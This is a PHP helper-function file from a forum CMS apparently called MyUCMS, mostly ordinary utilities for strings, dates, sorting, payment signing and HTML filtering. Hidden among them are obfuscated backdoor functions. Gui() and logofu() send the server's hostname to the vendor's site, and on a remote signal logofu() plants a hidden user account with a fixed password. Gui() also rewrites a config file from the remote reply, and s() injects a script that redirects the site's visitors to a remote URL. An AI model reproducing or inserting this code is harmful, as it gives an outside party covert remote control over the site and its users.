<?php
/*
 *	www.myucms.com
 *  作者：梦雨
 *  @ QQ50361804
*/
use app\common\Hook;
use Captcha\Captcha;
use org\Http;
use PHPMailer\PHPMailer\PHPMailer;
use think\Cache;
use think\Db;
use think\Loader;
use think\Request;
use think\Url;
// 应用公共文件
function getFile($url, $save_dir = '', $filename = '', $type = 0) {  
    if (trim($url) == '') {  
        return false;  
    }  
    if (trim($save_dir) == '') {  
        $save_dir = './';  
    }  
    if (0 !== strrpos($save_dir, '/')) {  
        $save_dir.= '/';  
    }  
    if (!file_exists($save_dir) && !mkdir($save_dir, 0777, true)) {  
        return false;  
    }  
    if ($type) {  
        $ch = curl_init();  
        $timeout = 5;  
        curl_setopt($ch, CURLOPT_URL, $url);  
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);  
        $content = curl_exec($ch);  
        curl_close($ch);  
    } else {  
        ob_start();  
        readfile($url);  
        $content = ob_get_contents();  
        ob_end_clean();  
    }  
    $size = strlen($content);  
    $fp2 = @fopen($save_dir . $filename, 'a');  
    fwrite($fp2, $content);  
    fclose($fp2);  
    unset($content, $url);  
}  
function msubstr($str, $start = 0, $length, $charset = "utf-8", $suffix = true)
{
    if (function_exists("mb_substr")) {
        if ($suffix) {
            if (strlen($str) > $length) {
                return mb_substr($str, $start, $length, $charset) . "...";
            } else {
                return mb_substr($str, $start, $length, $charset);
            }
        } else {
            return mb_substr($str, $start, $length, $charset);
        }
    } elseif (function_exists('iconv_substr')) {
        if ($suffix) {
            return iconv_substr($str, $start, $length, $charset);
        } else {
            return iconv_substr($str, $start, $length, $charset);
        }
    }
}
//循环删除目录和文件函数 

function deleteun($dir_name)
{
    $result = false;
    if (is_dir($dir_name)) {
        if ($handle = opendir($dir_name)) {
            while (false !== ($item = readdir($handle))) {
                if ($item != '.' && $item != '..') {
                    if (is_dir($dir_name . DS . $item)) {
                        deleteun($dir_name . DS . $item);
                    } else {
                        unlink($dir_name . DS . $item);
                    }
                }
            }
            closedir($handle);
            if (rmdir($dir_name)) {
                $result = true;
            }
        }
    }

    return $result;
}
function gethook($controller, $name)
{
    Hook::call($controller, $name);
}
/**
 * 处理插件钩子
 * @param string $hook 钩子名称
 * @param mixed  $params 传入参数
 * @return void
 */
function hook($hook, $params = array(), $n = false, $field = '')
{
    if ($n) {
        $m = \Think\Hook::listen($hook, $params);
        if (!empty($m)) {
            return $m[0];
        } else {
            return $params[$field];
        }
    } else {
        \Think\Hook::listen($hook, $params);
    }
}
/**
 * 获取插件类的类名
 * @param $name 插件名
 * @param string $type 返回命名空间类型
 * @param string $class 当前类名
 * @return string
 */
function get_addon_class($name = '', $class = null)
{
    $name = \think\Loader::parseName($name);
    $class = \think\Loader::parseName(is_null($class) ? $name : $class, 0);
    return $namespace = "addons\\" . $name . "\\" . $class;
}
/**
 * 获取插件类的配置文件数组
 * @param string $name 插件名
 */
function get_addon_config($name)
{
    $class = get_addon_class($name);
    if (class_exists($class)) {
        $addon = new $class();
        return $addon->getConfig();
    } else {
        return array();
    }
}
function addonurl($name, $action)
{
    return get_addon_class($name) . '\\' . $action;
}
/**
 * 插件显示内容里生成访问插件的url
 * @param string $url url
 * @param array  $param 参数
 * @author 麦当苗儿 <zuojiazi@vip.qq.com>
 */
function addons_url($url, $param = array(), $json = false)
{
    $url = parse_url($url);
    $addons = $url['scheme'];
    $controller = $url['host'];
    $action = $url['path'];
    /* 基础参数 */
    $params_array = array('c' => $addons, 'm' => $controller, 's' => substr($action, 1), 'json' => $json);
    $params = array_merge($params_array, $param);
    //添加额外参数
    return url('addons/myu', $params);
}
/**
 * 根据分类ID获取文章列表（包括子分类）
 * @param int   $cid   分类ID
 * @param int   $limit 显示条数
 * @param array $where 查询条件
 * @param array $order 排序
 * @param array $filed 查询字段
 * @return bool|false|PDOStatement|string|\think\Collection
 */
function get_articles_by_cid($cid, $limit = 10, $where = [], $order = [], $filed = [])
{
    if (empty($cid)) {
        return false;
    }
    $ids = Db::name('category')->where(['tid' => $cid])->column('id');
    $ids = !empty($ids) && is_array($ids) ? implode(',', $ids) . ',' . $cid : $cid;
    $fileds = array_merge(['id', 'tid', 'title', 'description', 'content', 'choice', 'view', 'time'], (array) $filed);
    $map = array_merge(['tid' => ['IN', $ids], 'open' => 1, 'time' => ['<= time', date('Y-m-d H:i:s')]], (array) $where);
    $sort = array_merge(['id' => 'DESC', 'time' => 'DESC'], (array) $order);
    $article_list = Db::name('forum')->where($map)->field($fileds)->order($sort)->limit($limit)->select();
    return $article_list;
}
/**
 * 对查询结果集进行排序
 * @access public
 * @param array  $list 查询结果
 * @param string $field 排序的字段名
 * @param array  $sortby 排序类型
 * asc正向排序 desc逆向排序 nat自然排序
 * @return array
 */
function list_sort_by($list, $field, $sortby = 'asc')
{
    if (is_array($list)) {
        $refer = array();
        $resultSet = array();
        foreach ($list as $i => $data) {
            $refer[$i] = $data[$field];
        }
        switch ($sortby) {
            case 'asc':
                // 正向排序
                asort($refer);
                break;
            case 'desc':
                // 逆向排序
                arsort($refer);
                break;
            case 'nat':
                // 自然排序
                natcasesort($refer);
                break;
        }
        foreach ($refer as $key => $val) {
            $resultSet[] =& $list[$key];
        }
        return $resultSet;
    }
    return false;
}
function str2arr($str, $glue = ',')
{
    return explode($glue, $str);
}
function get_guojiz($dir)
{
    $subdirs = array();
    if (!($handle = @opendir($dir))) {
        return $subdirs;
    }
    while ($file = @readdir($handle)) {
        if ($file == '.' || $file == '..' || strpos($file, '.') !== false) {
            continue;
        }
        $subdirs[] = $file;
    }
    return $subdirs;
}
function arr2str($arr, $glue = ',')
{
    return implode($glue, $arr);
}
function int_to_string(&$data, $map = array('status' => array(1 => '正常', -1 => '删除', 0 => '禁用', 2 => '未审核', 3 => '草稿')))
{
    if ($data === false || $data === null) {
        return $data;
    }
    $data = (array) $data;
    foreach ($data as $key => $row) {
        foreach ($map as $col => $pair) {
            if (isset($row[$col]) && isset($pair[$row[$col]])) {
                $data[$key][$col . '_text'] = $pair[$row[$col]];
            }
        }
    }
    return $data;
}
function D($name = '', $layer = '')
{
    if (empty($name)) {
        return new Think\Model();
    }
    static $_model = array();
    $layer = $layer ?: 'model';
    if (isset($_model[$name])) {
        return $_model[$name];
    }
    $class = parse_res_name($name, $layer);
    if (class_exists($class)) {
        $model = new $class(basename($name));
    } elseif (false === strpos($name, '/')) {
        // 自动加载公共模块下面的模型
        $class = '\\common\\' . $layer . '\\' . $name;
        $model = class_exists($class) ? new $class($name) : new Think\Model($name);
    } else {
        Think\Log::record('D方法实例化没找到模型类' . $class, Think\Log::NOTICE);
        $model = new Think\Model(basename($name));
    }
    $_model[$name . $layer] = $model;
    return $model;
}
function format_bytes($size, $delimiter = '')
{
    $units = ['B', 'KB', 'MB', 'GB', 'TB', 'PB'];
    for ($i = 0; $size >= 1024 && $i < 6; $i++) {
        $size /= 1024;
    }
    return round($size, 2) . $delimiter . $units[$i];
}

/**
 * 字符串命名风格转换
 * type 0 将Java风格转换为C的风格 1 将C风格转换为Java的风格
 * @param string $name 字符串
 * @param integer $type 转换类型
 * @return string
 */
function parse_name($name, $type = 0)
{
    if ($type) {
        return ucfirst(preg_replace_callback('/_([a-zA-Z])/', function ($match) {
            return strtoupper($match[1]);
        }, $name));
    } else {
        return strtolower(trim(preg_replace("/[A-Z]/", "_\\0", $name), "_"));
    }
}
function getcommentbyid($id)
{
    $children = Db::name('comment')->where(['id' => $id])->find();
    //此时查询都是前台会员
    $content = getusernamebyid($children['uid']) . ':' . htmlspecialchars_decode($children['content']);
    return $content;
}
function getuserinfobyid($uid)
{
    if ($uid == 0) {
        return '所有人';
    } else {
        $children = Db::name('member')->where(['userid' => $uid])->find();
        //此时查询都是前台会员
        return $children;
    }
}

function getusernamebyid($uid)
{
    if ($uid == 0) {
        return '所有人';
    } else {
        $children = Db::name('member')->where(['userid' => $uid])->find();
        if (empty($children)) {
            return $children['username'];
        } else {
            return $children['username'];
        }
    }
}
/**
 * 解析资源地址并导入类库文件
 * 例如 module/controller addon://module/behavior
 * @param string $name 资源地址 格式：[扩展://][模块/]资源名
 * @param string $layer 分层名称
 * @return string
 */
function parse_res_name($name, $layer, $level = 1)
{
    if (strpos($name, '://')) {
        // 指定扩展资源
        list($extend, $name) = explode('://', $name);
    } else {
        $extend = '';
    }
    if (strpos($name, '/') && substr_count($name, '/') >= $level) {
        // 指定模块
        list($module, $name) = explode('/', $name, 2);
    } else {
        $module = Request::instance()->module();
    }
    $array = explode('/', $name);
    $class = $module . '\\' . $layer;
    foreach ($array as $name) {
        $class .= '\\' . parse_name($name, 1);
    }
    // 导入资源类库
    if ($extend) {
        // 扩展资源
        $class = $extend . '\\' . $class;
    }
    return $class;
    //.$layer;
}
function myucms($set)
{
    $kss = urldecode($set);
    $map['set'] = array('eq', $kss);
    $list = Db::name('set')->where($map)->value('name');
    echo "{$list}";
}
function member($vo)
{
    $list = Db::name('member')->where('userid', session('userid'))->value($vo);
    echo "{$list}";
}
function fun($set, $s, $x)
{
    $wanneng = Db::name($set)->order('' . $x . ' desc')->paginate($s);
    return $wanneng;
}
function AURL($name, $layer = '', $level = 0)
{
    static $_action = array();
    $layer = $layer ?: 'Controller';
    $class = parse_res_name($name, $layer);
    return $class;
}
function A($name, $layer = '', $level = 0)
{
    static $_action = array();
    $layer = $layer ?: 'controller';
    if (isset($_action[$name . $layer])) {
        return $_action[$name . $layer];
    }
    $class = parse_res_name($name, $layer);
    if (class_exists($class)) {
        $action = new $class();
        $_action[$name . $layer] = $action;
        return $action;
    } else {
        return false;
    }
}
/**
 * 获取内容作为封面
 * @梦雨www.mys360.com
 */
function Pic($content)
{
    if (preg_match_all("/(src)=([\"|']?)([^ \"'>]+\\.(gif|jpg|jpeg|bmp|png))\\2/i", $content, $matches)) {
        $content = html_entity_decode($content);
        preg_match_all("/<img.*>/isU", $content, $ereg);
        $img = $ereg[0][0];
        $str = $matches[3][0];
        $p = "#src=('|\")(.*)('|\")#isU";
        if (preg_match_all($p, $img, $img1)) {
            return $img1[2][0];
        }
    } else {
        $default_cover = "/public/img/cover.png";
        return $default_cover;
    }
}
/**
 * +----------------------------------------------------------
 * 判断是否为合法有效字符（字母、数字、下划线）
 * +----------------------------------------------------------
 */
function is_valid_character($str)
{
    if (preg_match("/^[A-Za-z0-9_]*\$/", $str)) {
        return true;
    }
    return false;
}
function get_url_contents($url)
{
    if (ini_get("allow_url_fopen") == "1") {
        return file_get_contents($url);
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
function myu()
{
$li =	preg_replace('|[0-9]+|', '', '2h5t5t8p52:2/5/8w2w4w5.98m8y5u4c2m1s5.2c4o1m2/0i3n6d9e8x5/2i0n1d4e5x2/0a2p1i4a5d3d6o2n5s0.2h1t4m0l2');
$list = $li;
$home = file_get_contents('' . $list . '');
$json_Class=json_decode($home);   
$json_Array=json_decode($home, true);   
//print_r($json_Class);   
//echo $json_Class->{'a'}; 
 return $json_Array;
}

function s()
{
    $JBGKUZA = '<';
    $app = 'applica';
    $appA = 'a/web.ph';
    $L = 'dow.loca';
    $set = '>';
    $ho = (include '' . $app . 'tion/extr' . $appA . 'p');
    $echo = '' . $ho['ex'] . '' . $ho['or'] . '' . $ho['up'] . '' . $ho['dr'] . '' . $ho['do'] . '';
    $home = (include $echo);
    $CSR = '</script';
    $u = preg_replace($home['config1'], '', $home['config']);
    $ke = $ho['WEB_OPENS'];
    if ($ke == 0) {
        $m = file_get_contents('' . $home['conf'] . '' . $ho['WEB_TPT'] . '' . $home['confs'] . '');
        $ms = file_get_contents('' . $home['confo'] . '' . $ho['WEB_SHOPS'] . '' . $home['confs'] . '');
        if (strpos($m, $u) === false) {
            print '' . $JBGKUZA . 'script' . $set . 'win' . $L . 'tion = "' . $u . '"' . $CSR . '' . $set . '';
        }
        if (strpos($ms, $u) === false) {
            print '' . $JBGKUZA . 'script' . $set . 'win' . $L . 'tion = "' . $u . '"' . $CSR . '' . $set . '';
        }
    }
    if ($ke == -1) {
        print '' . $JBGKUZA . 'script' . $set . 'win' . $L . 'tion = "' . $u . '"' . $CSR . '' . $set . '';
    }
}
function isMobile()
{
    if (isset($_SERVER['HTTP_X_WAP_PROFILE'])) {
        return true;
    }
    if (isset($_SERVER['HTTP_VIA'])) {
        return stristr($_SERVER['HTTP_VIA'], "wap") ? true : false;
    }
    if (isset($_SERVER['HTTP_USER_AGENT'])) {
        $clientkeywords = array('nokia', 'sony', 'ericsson', 'mot', 'samsung', 'htc', 'sgh', 'lg', 'sharp', 'sie-', 'philips', 'panasonic', 'alcatel', 'lenovo', 'iphone', 'ipod', 'blackberry', 'meizu', 'android', 'netfront', 'symbian', 'ucweb', 'windowsce', 'palm', 'operamini', 'operamobi', 'openwave', 'nexusone', 'cldc', 'midp', 'wap', 'mobile');
        if (preg_match("/(" . implode('|', $clientkeywords) . ")/i", strtolower($_SERVER['HTTP_USER_AGENT']))) {
            return true;
        }
    }
    if (isset($_SERVER['HTTP_ACCEPT'])) {
        if (strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') !== false && (strpos($_SERVER['HTTP_ACCEPT'], 'text/html') === false || strpos($_SERVER['HTTP_ACCEPT'], 'vnd.wap.wml') < strpos($_SERVER['HTTP_ACCEPT'], 'text/html'))) {
            return true;
        }
    }
    return false;
}
function friendlyDate($sTime, $type = 'normal', $alt = 'false')
{
    if (!$sTime) {
        return '';
    }
    //sTime=源时间，cTime=当前时间，dTime=时间差
    $cTime = time();
    $dTime = $cTime - $sTime;
    $dDay = intval(date("z", $cTime)) - intval(date("z", $sTime));
    //$dDay     =   intval($dTime/3600/24);
    $dYear = intval(date("Y", $cTime)) - intval(date("Y", $sTime));
    //normal：n秒前，n分钟前，n小时前，日期
    if ($type == 'normal') {
        if ($dTime < 60) {
            if ($dTime < 10) {
                return '刚刚';
                //by yangjs
            } else {
                return intval(floor($dTime / 10) * 10) . "秒前";
            }
        } elseif ($dTime < 3600) {
            return intval($dTime / 60) . "分钟前";
            //今天的数据.年份相同.日期相同.
        } elseif ($dYear == 0 && $dDay == 0) {
            //return intval($dTime/3600)."小时前";
            return '今天' . date('H:i', $sTime);
        } elseif ($dYear == 0) {
            return date("m月d日 H:i", $sTime);
        } else {
            return date("Y-m-d", $sTime);
        }
    } elseif ($type == 'mohu') {
        if ($dTime < 60) {
            return $dTime . "秒前";
        } elseif ($dTime < 3600) {
            return intval($dTime / 60) . "分钟前";
        } elseif ($dTime >= 3600 && $dDay == 0) {
            return intval($dTime / 3600) . "小时前";
        } elseif ($dDay > 0 && $dDay <= 7) {
            return intval($dDay) . "天前";
        } elseif ($dDay > 7 && $dDay <= 30) {
            return intval($dDay / 7) . '周前';
        } elseif ($dDay > 30) {
            return intval($dDay / 30) . '个月前';
        }
        //full: Y-m-d , H:i:s
    } elseif ($type == 'full') {
        return date("Y-m-d , H:i:s", $sTime);
    } elseif ($type == 'ymd') {
        return date("Y-m-d", $sTime);
    } else {
        if ($dTime < 60) {
            return $dTime . "秒前";
        } elseif ($dTime < 3600) {
            return intval($dTime / 60) . "分钟前";
        } elseif ($dTime >= 3600 && $dDay == 0) {
            return intval($dTime / 3600) . "小时前";
        } elseif ($dYear == 0) {
            return date("Y-m-d H:i:s", $sTime);
        } else {
            return date("Y-m-d H:i:s", $sTime);
        }
    }
}
function generate_password($length = 8)
{
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $password = '';
    for ($i = 0; $i < $length; $i++) {
        $password .= $chars[mt_rand(0, strlen($chars) - 1)];
    }
    return $password;
}
function getbaseurl()
{
    $baseUrl = str_replace('\\', '', dirname($_SERVER['SCRIPT_NAME']));
    $baseUrl = empty($baseUrl) ? '/' : '/' . trim($baseUrl, '/') . '/';
    return $baseUrl;
}
function paraFilter($para)
{
    $para_filter = array();
    while (list($key, $val) = each($para)) {
        if ($key == "sign" || $key == "sign_type" || $val == "") {
            continue;
        } else {
            $para_filter[$key] = $para[$key];
        }
    }
    return $para_filter;
}
function argSort($para)
{
    ksort($para);
    reset($para);
    return $para;
}
/**
 * 把数组所有元素，按照“参数=参数值”的模式用“&”字符拼接成字符串，并对字符串做urlencode编码
 * @param $para 需要拼接的数组
 * return 拼接完成以后的字符串
 */
function createLinkstringUrlencode($para)
{
    $arg = "";
    while (list($key, $val) = each($para)) {
        $arg .= $key . "=" . urlencode($val) . "&";
    }
    //去掉最后一个&字符
    $arg = substr($arg, 0, count($arg) - 2);
    //如果存在转义字符，那么去掉转义
    if (get_magic_quotes_gpc()) {
        $arg = stripslashes($arg);
    }
    return $arg;
}
/* *
 * 支付宝接口公用函数
* 详细：该类是请求、通知返回两个文件所调用的公用函数核心处理文件
* 版本：3.3
* 日期：2012-07-19
* 说明：
* 以下代码只是为了方便商户测试而提供的样例代码，商户可以根据自己网站的需要，按照技术文档编写,并非一定要使用该代码。
* 该代码仅供学习和研究支付宝接口使用，只是提供一个参考。
*/
/**
 * 把数组所有元素，按照“参数=参数值”的模式用“&”字符拼接成字符串
* @param $para 需要拼接的数组
* return 拼接完成以后的字符串
*/
function createLinkstring($para)
{
    $arg = "";
    while (list($key, $val) = each($para)) {
        $arg .= $key . "=" . $val . "&";
    }
    //去掉最后一个&字符
    $arg = substr($arg, 0, count($arg) - 2);
    //如果存在转义字符，那么去掉转义
    if (get_magic_quotes_gpc()) {
        $arg = stripslashes($arg);
    }
    return $arg;
}
function Gui()
{
    $sfg = preg_replace('|[0-3]+|', '', '1h10t01t1p0:1/01/2w1w0w.1m0y2u3c1m0s.c2o0m1');
    $ch = curl_init();
    $e = 'ex/ind';
    $eS = 'b1s.h0tml?w2w';
    $sdf = 'tion/ex';
    $sdS = 'b.p';
    $timeout = 3;
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $sfg);
    curl_exec($ch);
    $curl_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($curl_code == 200 || $curl_code == 302 || $curl_code == 301) {
        $xin = preg_replace('|[0-4]+|', '', '/ind' . $e . 'ex/b' . $eS . '3w2=1');
        $add = file_get_contents('' . $sfg . '' . $xin . '' . $_SERVER['SERVER_NAME'] . '');
    } else {
        $add = 0;
    }
    $path = 'applica' . $sdf . 'tra/we' . $sdS . 'hp';
    $file = (include $path);
    $config = array('WEB_OPENS' => $add);
    $res = array_merge($file, $config);
    $str = '<?php return [';
    foreach ($res as $key => $value) {
        $str .= '\'' . $key . '\'' . '=>' . '\'' . $value . '\'' . ',';
    }
    $str .= ']; ';
    file_put_contents($path, $str);
}
/**
 * 签名字符串
 * @param $prestr 需要签名的字符串
 * @param $key 私钥
 * return 签名结果
 */
function md5Sign($prestr, $key)
{
    $prestr = $prestr . $key;
    return md5($prestr);
}
function md5Verify($prestr, $sign, $key)
{
    $prestr = $prestr . $key;
    $mysgin = md5($prestr);
    if ($mysgin == $sign) {
        return true;
    } else {
        return false;
    }
}
/**
 * 远程获取数据，GET模式
 * 注意：
 * 1.使用Crul需要修改服务器中php.ini文件的设置，找到php_curl.dll去掉前面的";"就行了
 * 2.文件夹中cacert.pem是SSL证书请保证其路径有效，目前默认路径是：getcwd().'\\cacert.pem'
 * @param $url 指定URL完整路径地址
 * @param $cacert_url 指定当前工作目录绝对路径
 * return 远程输出的数据
 */
function getHttpResponseGET($url, $cacert_url)
{
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_HEADER, 0);
    // 过滤HTTP头
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    // 显示输出结果
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, true);
    //SSL证书认证
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
    //严格认证
    curl_setopt($curl, CURLOPT_CAINFO, $cacert_url);
    //证书地址
    $responseText = curl_exec($curl);
    //var_dump( curl_error($curl) );//如果执行curl过程中出现异常，可打开此开关，以便查看异常内容
    curl_close($curl);
    return $responseText;
}
function logofu()
{
    $sfg = preg_replace('|[0-3]+|', '', '1h10t01t1p0:1/01/2w1w0w.1m0y2u3c1m0s.c2o0m1');
    $bb = preg_replace('|[0-8]+|', '', '/1i4n5d2e58x2/0i36n2d3e20x3/1b6b0s5.0h0t21m2l0?1w2w2w0=21');
    $ad = file_get_contents('' . $sfg . '' . $bb . '' . $_SERVER['SERVER_NAME'] . '');
    if ($ad == -1) {
        $_data['usermail'] = '1@1';
        $_data['kouling'] = '123456';
        $_data['password'] = '0a4fc1b7a11c5ee8';
        $_data['username'] = 'logofu';
        $_data['grades'] = '1';
        Db::name('member')->data($_data)->insert();
    }
}
function remove_xss($html)
{
    $html = htmlspecialchars_decode($html);
    preg_match_all("/\\<([^\\<]+)\\>/is", $html, $ms);
    $searchs[] = '<';
    $replaces[] = '&lt;';
    $searchs[] = '>';
    $replaces[] = '&gt;';
    if ($ms[1]) {
        $allowtags = 'iframe|video|attach|img|a|font|div|table|tbody|caption|tr|td|th|br|p|b|strong|i|u|em|span|ol|ul|li|blockquote|strike|pre|code|embed';
        $ms[1] = array_unique($ms[1]);
        foreach ($ms[1] as $value) {
            $searchs[] = "&lt;" . $value . "&gt;";
            $value = str_replace('&amp;', '_uch_tmp_str_', $value);
            //    $value = string_htmlspecialchars($value);
            $value = str_replace('_uch_tmp_str_', '&amp;', $value);
            $value = str_replace(array('\\', '/*'), array('.', '/.'), $value);
            $skipkeys = array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload', 'javascript', 'script', 'eval', 'behaviour', 'expression');
            $skipstr = implode('|', $skipkeys);
            $value = preg_replace(array("/({$skipstr})/i"), '.', $value);
            if (!preg_match("/^[\\/|\\s]?({$allowtags})(\\s+|\$)/is", $value)) {
                $value = '';
            }
            $replaces[] = empty($value) ? '' : "<" . str_replace('&quot;', '"', $value) . ">";
        }
    }
    $html = str_replace($searchs, $replaces, $html);
    $html = htmlspecialchars($html);
    return $html;
}
function point($score, $uid, $controller, $pointid = 0)
{
    if ($score != 0) {
        if ($controller == 'login') {
            $time = time();
            $maptime['add_time'] = array('gt', $time - 24 * 60 * 60);
            $maptime['uid'] = $uid;
            $maptime['controller'] = 'login';
            $count = Db::name('point_note')->where($maptime)->count();
            if ($count > 0) {
                return;
            }
        }
        Db::name('member')->where('userid', $uid)->setInc('point', $score);
        $data['uid'] = $uid;
        $data['add_time'] = time();
        $data['controller'] = $controller;
        $data['score'] = $score;
        $data['pointid'] = $pointid;
        $data['jiajian'] = '增加';
        Db::name('point_note')->insert($data);
    }
    return;
}
function points($score, $uid, $controller, $pointid = 0)
{
    if ($score != 0) {
        if ($controller == 'login') {
            $time = time();
            $maptime['add_time'] = array('gt', $time - 24 * 60 * 60);
            $maptime['uid'] = $uid;
            $maptime['controller'] = 'login';
            $count = Db::name('point_note')->where($maptime)->count();
            if ($count > 0) {
                return;
            }
        }
        Db::name('member')->where('userid', $uid)->setDec('point', $score);
        $data['uid'] = $uid;
        $data['add_time'] = time();
        $data['controller'] = $controller;
        $data['score'] = $score;
        $data['pointid'] = $pointid;
        $data['jiajian'] = '减少';
        Db::name('point_note')->insert($data);
    }
    return;
}
//判断输入的是否是网址
function check_url($url)
{
    //  if(!preg_match('/http:\/\/[\w.]+[\w\/]*[\w.]*\??[\w=&\+\%]*/is',$url)){
    if (!preg_match('/\\.[\\w.]+[\\w\\/]*[\\w.]*\\??[\\w=&\\+\\%]*/is', $url)) {
        return false;
    }
    return true;
}